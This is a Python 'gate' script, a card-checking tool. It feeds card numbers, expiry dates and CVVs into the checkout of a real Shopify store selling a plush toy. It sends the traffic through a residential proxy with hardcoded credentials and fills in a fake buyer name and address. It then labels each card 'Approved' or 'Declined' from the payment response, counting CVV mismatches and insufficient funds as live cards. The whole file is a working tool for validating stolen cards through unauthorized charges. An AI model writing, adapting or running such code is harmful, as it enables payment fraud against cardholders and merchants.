from requests import Session

def getstr(text: str, a: str, b: str) -> str: return text.split(a)[1].split(b)[0]


class ChasePayment:
    'clase dedicada al nuevo gate de charged'
    
    def main(self,card):
        try:
            self.session = Session()

            self.ccs = card.split('|')

            ccv = len(self.ccs[2])
            
            self.cvv = self.ccs[2]
             
            if ccv == 4:
                self.cvv = self.ccs[2][2:4]
            
            
            if self.ccs[0].startswith("4"): self.brand = "visa"
            if self.ccs[0].startswith("3"): self.brand = "amex"
            if self.ccs[0].startswith("6"): self.brand = "discover"
            elif self.ccs[0].startswith("5"): self.brand = "master"
            
            self.session.proxies.update({'http://': 'http://5lsbptwhow0s8kt:4zubvgfavptnx9y@rp.scrapegw.com:6060', 'https://': 'http://5lsbptwhow0s8kt:4zubvgfavptnx9y@rp.scrapegw.com:6060'})

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'}
            self.session.get('https://pertry.com/collections/purple-collection/products/buddy', headers=headers)
            
            headers = {'content-type': 'application/x-www-form-urlencoded','origin': 'https://pertry.com','referer': 'https://pertry.com/collections/purple-collection/products/buddy','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'}
            data = {'Color': 'Blue Stitch','form_type': 'product','utf8': '✓','id': '46346594877607','product-id': '8419315581095','section-id': 'template--17894936772775__main'}
            self.session.post('https://pertry.com/cart/add.js', headers=headers, data=data)
            
            headers = {'referer': 'https://pertry.com/collections/purple-collection/products/buddy?variant=46346594877607','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'}
            self.Req1 = self.session.get('https://pertry.com/cart.json', headers=headers)
            self.token1 = self.Req1.json()['token']

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','content-type': 'application/x-www-form-urlencoded','origin': 'https://pertry.com','referer': 'https://pertry.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'}
            data = {'cart_data': "%7B%22token%22:%22Z2NwLXVzLWVhc3QxOjAxSlJQRkc3WUNCR1dSM044NUJNNTFDRVBX?key=f90936b3b47f488375f910472cdf071b%22,%22note%22:%22%22,%22attributes%22:%7B%7D,%22original_total_price%22:995,%22total_price%22:995,%22total_discount%22:0,%22total_weight%22:0,%22item_count%22:1,%22items%22:%5B%7B%22id%22:46346594877607,%22properties%22:%7B%7D,%22quantity%22:1,%22variant_id%22:46346594877607,%22key%22:%2246346594877607:496dfbd9d82350b99ece8a2b4a681bb3%22,%22title%22:%22The%20Sleepy%20Buddy%20-%20Blue%20Stitch%22,%22price%22:995,%22original_price%22:995,%22presentment_price%22:9.95,%22discounted_price%22:995,%22line_price%22:995,%22original_line_price%22:995,%22total_discount%22:0,%22discounts%22:%5B%5D,%22sku%22:%22S1%22,%22grams%22:0,%22vendor%22:%22Avara%C2%AE%22,%22taxable%22:true,%22product_id%22:8419315581095,%22product_has_only_default_variant%22:false,%22gift_card%22:false,%22final_price%22:995,%22final_line_price%22:995,%22url%22:%22/products/buddy?variant=46346594877607%22,%22featured_image%22:%7B%22aspect_ratio%22:0.999,%22alt%22:%22The%20Sleepy%20Buddy%22,%22height%22:700,%22url%22:%22https://cdn.shopify.com/s/files/1/0668/3544/7975/files/pimg_c31631b49dac6c2ae087.webp?v=1733681882%22,%22width%22:699%7D,%22image%22:%22https://cdn.shopify.com/s/files/1/0668/3544/7975/files/pimg_c31631b49dac6c2ae087.webp?v=1733681882%22,%22handle%22:%22buddy%22,%22requires_shipping%22:true,%22product_type%22:%22%22,%22product_title%22:%22The%20Sleepy%20Buddy%22,%22product_description%22:%22The%20#1%20Rated%20Anti-Anxiety%20Product%20of%202024%5Cn%5CnThe%20Sleepy%20Buddy%20was%20proven%20to%20reduce%20anxiety%20by%2080%25%20in%20a%20study%20conducted%20by%20Columbia%20University,%20through%20its%20lifelike%20calming%20breathing%20feature!%5Cn%5Cn%5CnFight%20against%20anxiety,%20insomnia,%20and%20stress%5Cn%5CnWe%20know%20how%20much%20everyday%20challenges%20can%20weigh%20on%20your%20well-being.%20Anxiety,%20insomnia,%20depression...%20These%20ailments%20are%20becoming%20more%20and%20more%20common%20and%20can%20seriously%20affect%20your%20quality%20of%20life.%20It%20is%20essential%20to%20find%20effective%20ways%20to%20relax%20and%20find%20inner%20peace%5Cn%5CnWeighted%20Breathing%20Plushies%20&%20Their%20Benefits:%5Cn%5CnWith%20their%20soft%20texture%20and%20adorable%20ears,%20these%20plushies%20doesn't%20just%20look%20cute,%20they%20literally%20breathe!%20This%20steady,%20soothing%20breath%20is%20designed%20to%20calm%20your%20mind,%20reduce%20anxiety,%20and%20help%20you%20get%20a%20deep,%20restful%20sleep.%5Cn%E2%9D%A4%EF%B8%8F%20Feel%20Calmer%5Cn%5CnStitch%20Breathing%20is%20not%20just%20a%20plush%20toy;%20it%20simulates%20gentle,%20steady%20breathing,%20creating%20the%20comforting%20feeling%20of%20a%20presence%20by%20your%20side.%20Whether%20you're%20home%20alone%20or%20in%20need%20of%20emotional%20support,%20Stitch%20is%20there%20to%20soothe%20you.%5Cn%F0%9F%98%A8%20Stress-Relieving%5Cn%5CnWith%20its%20breathing%20feature,%20our%20plushies%20help%20you%20synchronize%20your%20breathing,%20reducing%20your%20stress%20levels%20in%20minutes.%20Just%20a%20moment%20spent%20with%20Stitch%20can%20turn%20a%20stressful%20day%20into%20a%20calming%20experience.%5Cn%F0%9F%8C%99%20Insomnia%20Helper%5Cn%5CnLet%20our%20plushies%20guide%20you%20to%20a%20restful%20sleep.%20The%20steady%20breathing%20helps%20calm%20your%20mind,%20promoting%20better%20quality%20sleep.%20Say%20goodbye%20to%20restless%20nights%20and%20hello%20to%20peaceful%20sleep.%5Cn%F0%9F%8E%81%20Perfect%20gift%5Cn%5CnPerfect%20for%20all%20those%20of%20all%20ages,%20it's%20a%20gift%20that%20shows%20you%20care!%C2%A0%5Cn%5Cn%5Cn%5Cn%5Cn%5Cn%5Cn%22,%22variant_title%22:%22Blue%20Stitch%22,%22variant_options%22:%5B%22Blue%20Stitch%22%5D,%22options_with_values%22:%5B%7B%22name%22:%22Color%22,%22value%22:%22Blue%20Stitch%22%7D%5D,%22line_level_discount_allocations%22:%5B%5D,%22line_level_total_discount%22:0,%22has_components%22:false%7D%5D,%22requires_shipping%22:true,%22currency%22:%22USD%22,%22items_subtotal_price%22:995,%22cart_level_discount_applications%22:%5B%5D%7D",'slug': 'bqmgth-dc','base_url': 'bqmgth-dc.myshopify.com','redirection': 'pertry.com'}
            self.Req2 = self.session.post('https://checkout.tryavara.com/checkout', headers=headers, data=data)
            cookies_josn = str(self.session.cookies.get_dict())
            
            TokenXsrf = getstr(cookies_josn,"'XSRF-TOKEN': '","'") 
            csrf_token = getstr(self.Req2.text, '<meta name="csrf-token" content="','"')
            
            headers = {'accept': 'application/json, text/plain, */*','content-type': 'application/json','origin': 'https://checkout.tryavara.com','referer': 'https://checkout.tryavara.com/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36','x-csrf-token': csrf_token,'x-requested-with': 'XMLHttpRequest','x-xsrf-token': TokenXsrf}
            json_data = {'dynamic_shipping_charge': None,'dynamic_product_price': []}
            self.session.post('https://checkout.tryavara.com/api/v3/checkout/reset-cart',headers=headers,json=json_data)

            headers = {    'accept': 'application/json, text/plain, */*','content-type': 'application/json','origin': 'https://checkout.tryavara.com','referer': 'https://checkout.tryavara.com/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36','x-csrf-token': csrf_token,'x-requested-with': 'XMLHttpRequest','x-xsrf-token': TokenXsrf}
            json_data = {'prospect': {'email': 'valerie.jenkins@gmail.com','phone': '8194544131','first_name': 'Lucas','last_name': 'Lorenzo','address': 'E Little York Rd 7912','address2': '','city': 'Norman','state': 'CA',        'country': 'US','zip': '10010','dial_code': '1','custom_fields': [],}}
            self.session.post('https://checkout.tryavara.com/api/v3/checkout/create-prospect',headers=headers,json=json_data)
            
            headers = {'accept': 'application/json, text/plain, */*','origin': 'https://checkout.tryavara.com','referer': 'https://checkout.tryavara.com/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36','x-csrf-token': csrf_token,'x-requested-with': 'XMLHttpRequest','x-xsrf-token': TokenXsrf}
            self.session.post('https://checkout.tryavara.com/api/v3/checkout/sessions', headers=headers)
            
            headers = {'accept': 'application/json, text/plain, */*','content-type': 'application/json','origin': 'https://checkout.tryavara.com','referer': 'https://checkout.tryavara.com/checkout','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36','x-csrf-token': csrf_token,'x-requested-with': 'XMLHttpRequest','x-xsrf-token': TokenXsrf}
            json_data = {'shipping_id': 7,'dynamic_shipping_charge': None,'card': {'cc_number': self.ccs[0],'cc_name': 'Lucas Lorenzo','cc_type': self.brand,'mmyy': '{}/{}'.format(self.ccs[1],self.cvv),'mm': '','yy': '','cvv': self.ccs[3],'custom_fields': [],},'billing': {'first_name': '','last_name': '','address': '','address2': '','city': '','state': '','country': '','zip': '','billing_different': '0','custom_fields': []}}
            response = self.session.post('https://checkout.tryavara.com/api/v3/checkout/create-order-with-prospect',headers=headers,json=json_data)

            
            if '"status":false' in response.text:
                msg = response.json()['message']
    
                if 'CVV2 Mismatch' in  response.text: return 'Approved! ✅ ',msg
                elif 'Invalid CVV' in  response.text: return 'Approved! ✅ ',msg
                elif 'Insufficient funds' in  response.text: return 'Approved! ✅ ',msg
                else:return 'Declined! ❌', msg
            
            else: return'Approved! ✅', 'Charged 24.68'
        
        except: return 'Declined! ❌', 'Invalid card number. ( dead )'
